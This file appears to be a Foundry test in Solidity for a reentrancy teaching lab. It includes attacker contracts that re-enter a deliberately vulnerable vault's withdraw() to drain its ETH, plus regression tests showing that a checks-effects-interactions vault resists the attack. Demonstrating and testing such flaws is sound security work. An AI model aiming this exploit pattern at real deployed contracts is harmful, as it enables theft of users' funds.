// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {VulnerableVault} from "../src/VulnerableVault.sol";
import {SafeVault} from "../src/SafeVault.sol";

/// @title Reentrancy.t.sol
/// @notice Lab 01 — Exploit + regression test for reentrancy.
///
/// Lab: Reentrancy (checks-effects-interactions)
///
/// Threat model:
///   An attacker contract receives ETH via `receive()` and re-enters
///   `vault.withdraw()` before the vault has decremented the attacker's
///   balance. Both calls send ETH before their debits; the outer debit
///   then underflows in the intentionally unchecked accounting.
///
/// Violated invariant:
///   "balances[msg.sender] >= amount held" — broken because accounting
///   is updated AFTER the external call.
///
/// Reproduction:
///   1. Deploy VulnerableVault.
///   2. Victim deposits 1 ETH.
///   3. Attacker seeds 1 ETH, then calls attack(1 ether).
///   4. Inside withdraw, the vault calls attacker.receive() with 1 ETH.
///   5. Attacker.receive() calls vault.withdraw(1 ether) again — balance
///      check still passes because accounting hasn't been updated.
///   6. Vault sends another 1 ETH. Attacker drained 2 ETH from a 2 ETH
///      vault (1 ETH victim + 1 ETH attacker own).
///
/// Remediation:
///   Apply checks-effects-interactions: decrement balance before the
///   external call (see SafeVault).
///
/// Regression test:
///   The same exploit against SafeVault must revert (insufficient balance).
interface IVault {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract ReentrancyAttacker {
    IVault public immutable vault;
    uint256 public reentries;

    constructor(IVault vault_) {
        vault = vault_;
    }

    function seed() external payable {
        vault.deposit{value: msg.value}();
    }

    function attack(uint256 amount) external {
        vault.withdraw(amount);
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether && reentries == 0) {
            reentries = 1;
            vault.withdraw(1 ether);
        }
    }
}

/// @notice Re-enters withdraw() with the same partial amount during the
///         payout callback, to prove a partial withdrawal leaves the
///         remainder spendable.
contract PartialReentrancyAttacker {
    IVault public immutable vault;
    uint256 public reentries;
    uint256 public reentryAmount;

    constructor(IVault vault_) {
        vault = vault_;
    }

    function seed() external payable {
        vault.deposit{value: msg.value}();
    }

    function attack(uint256 amount) external {
        reentryAmount = amount;
        vault.withdraw(amount);
    }

    receive() external payable {
        if (reentries == 0) {
            reentries = 1;
            vault.withdraw(reentryAmount);
        }
    }
}

contract ReentrancyTest is Test {
    VulnerableVault vulnerable;
    SafeVault safe;
    ReentrancyAttacker attacker;

    function setUp() public {
        vulnerable = new VulnerableVault();
        safe = new SafeVault();
        attacker = new ReentrancyAttacker(IVault(address(vulnerable)));

        vm.deal(address(this), 2 ether);
        vulnerable.deposit{value: 1 ether}();
        attacker.seed{value: 1 ether}();
    }

    /// @notice Exploit: drains 2 ETH from the vulnerable vault.
    function testVulnerableVaultCanBeReentered() public {
        attacker.attack(1 ether);

        assertEq(address(attacker).balance, 2 ether, "attacker did not drain twice");
        assertEq(address(vulnerable).balance, 0, "vault still has funds");
    }

    function testPartialWithdrawalPreservesRemainingCredit() public {
        address depositor = makeAddr("depositor");
        vm.deal(depositor, 2 ether);
        vm.startPrank(depositor);

        vulnerable.deposit{value: 2 ether}();
        vulnerable.withdraw(1 ether);
        assertEq(vulnerable.balances(depositor), 1 ether, "remaining credit lost");

        vulnerable.withdraw(1 ether);
        assertEq(vulnerable.balances(depositor), 0, "credit not fully withdrawn");
        assertEq(depositor.balance, 2 ether, "depositor did not recover both withdrawals");
        vm.stopPrank();
    }

    /// @notice SafeVault partial credit: a partial withdrawal credits the
    ///         partial amount, leaves the remainder, and a second
    ///         (reentrant) withdraw of the remainder works.
    function testSafeVaultPartialWithdrawalLeavesRemainderSpendable() public {
        PartialReentrancyAttacker partialAttacker = new PartialReentrancyAttacker(IVault(address(safe)));
        vm.deal(address(this), 1 ether);
        partialAttacker.seed{value: 1 ether}();

        assertEq(safe.balances(address(partialAttacker)), 1 ether, "seed deposit must credit in full");

        partialAttacker.attack(0.5 ether);

        // The reentrant second withdraw of the remainder succeeded: the
        // attacker recovered the whole deposit in two halves, nothing more.
        assertEq(partialAttacker.reentries(), 1, "reentrant second withdraw must have run");
        assertEq(address(partialAttacker).balance, 1 ether, "both halves must be paid out");
        assertEq(safe.balances(address(partialAttacker)), 0, "no credit may remain");
        assertEq(address(safe).balance, 0, "vault must be empty after full recovery");
    }

    /// @notice Regression: SafeVault rejects re-entry.
    function testSafeVaultRejectsReentry() public {
        // setUp spent the dealt 2 ETH on the vulnerable-vault deposits.
        vm.deal(address(this), 2 ether);

        ReentrancyAttacker safeAttacker = new ReentrancyAttacker(IVault(address(safe)));
        safeAttacker.seed{value: 1 ether}();

        // A second (victim) deposit keeps the safe vault funded, so the
        // attacker's re-entry attempt actually reaches the balance check.
        safe.deposit{value: 1 ether}();

        vm.expectRevert();
        safeAttacker.attack(1 ether);

        assertEq(address(safe).balance, 2 ether, "safe vault lost funds");
    }
}
